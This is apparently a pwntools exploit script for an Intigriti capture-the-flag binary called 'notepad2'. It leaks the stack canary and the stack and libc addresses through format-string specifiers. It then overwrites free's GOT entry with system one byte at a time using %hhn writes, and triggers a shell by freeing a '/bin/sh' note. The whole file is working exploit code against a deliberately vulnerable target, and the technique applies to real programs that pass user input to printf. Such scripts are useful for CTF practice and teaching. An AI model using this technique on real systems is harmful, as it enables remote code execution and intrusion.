#!/usr/bin/env python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './notepad2_patched'
elf = context.binary = ELF(exe, checksec=True)
libc = './libc.so.6'
libc = ELF(libc, checksec=False)
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h", "-p", "65"]
host, port = 'notepad2.ctf.intigriti.io', 1342

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg

# break *0x4015e6
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
# pwndbg> checksec
#     Arch:     amd64-64-little
#     RELRO:    Partial RELRO
#     Stack:    Canary found
#     NX:       NX enabled
#     PIE:      No PIE (0x3fe000)
#     RUNPATH:  b'.'

def create(idx, data):
    io.sendlineafter(b'>', b'1')
    io.sendlineafter(b'>', str(idx).encode())
    io.sendlineafter(b'>', data)

def view(idx):
    io.sendlineafter(b'>', b'2')
    io.sendlineafter(b'>', str(idx).encode())

def remove(idx):
    io.sendlineafter(b'>', b'3')
    io.sendlineafter(b'>', str(idx).encode())

def write_addr(start, addr):
    bytes = bytearray.fromhex(hex(addr)[2:])[::-1].ljust(8, b'\x00')

    for idx, val in enumerate(bytes):
        if idx != 0:
            payload = f'%{start+idx}c%14$hhn'.encode()
            create(1, payload)
            view(1)
            remove(1)

        if val != 0:
            payload = f'%{val}c%44$hhn'.encode()
        else:
            payload = f'%44$hhn'.encode()

        create(1, payload)
        view(1)
        remove(1)

def write_single_lower_byte(idx1, idx2, lower_byte, val):
    if lower_byte != 0:
        payload = f'%{lower_byte}c%14$hhn'.encode()
        create(idx1, payload)
        view(idx1)

    if val != 0:
        payload = f'%{val}c%44$hhn'.encode()
    else:
        payload = f'%44$hhn'.encode()

    create(idx2, payload)
    view(idx2)

def arb_single_byte(idx, val):
    if val != 0:
        payload = f'%{val}c%45$hhn'.encode()
    else:
        payload = f'%45$hhn'.encode()
    create(idx, payload)
    view(idx)

def exploit():
    global io
    io = initialize()

    # 7 canary
    create(0, b'%7$p|%8$p|%13$p|%44$p|')
    view(0)

    io.recvuntil(b'0x')
    canary = int(io.recvuntil(b'|', drop=True), 16)
    stack = int(io.recvuntil(b'|', drop=True), 16)
    libc.address = int(io.recvuntil(b'|', drop=True), 16) - libc.sym['__libc_start_call_main'] - 128
    jmp_stack = int(io.recvuntil(b'|', drop=True), 16)
    lower_byte = (jmp_stack & 0xff)

    write_addr(lower_byte, elf.got['free'])

    free_lower_addr = bytearray.fromhex(hex(libc.sym['system'])[2:])[::-1][:3]

    remove(0)

    write_single_lower_byte(0, 1, lower_byte, 0x0)
    arb_single_byte(2, free_lower_addr[0])
    write_single_lower_byte(3, 4, lower_byte, 0x1)
    arb_single_byte(5, free_lower_addr[1])
    write_single_lower_byte(6, 7, lower_byte, 0x2)
    arb_single_byte(8, free_lower_addr[2])

    create(9, b'/bin/sh\x00')
    remove(9)

    log.info("canary: %#x", canary)
    log.info("stack: %#x", stack)
    log.info("libc: %#x", libc.address)
    io.interactive()
    
if __name__ == '__main__':
    exploit()
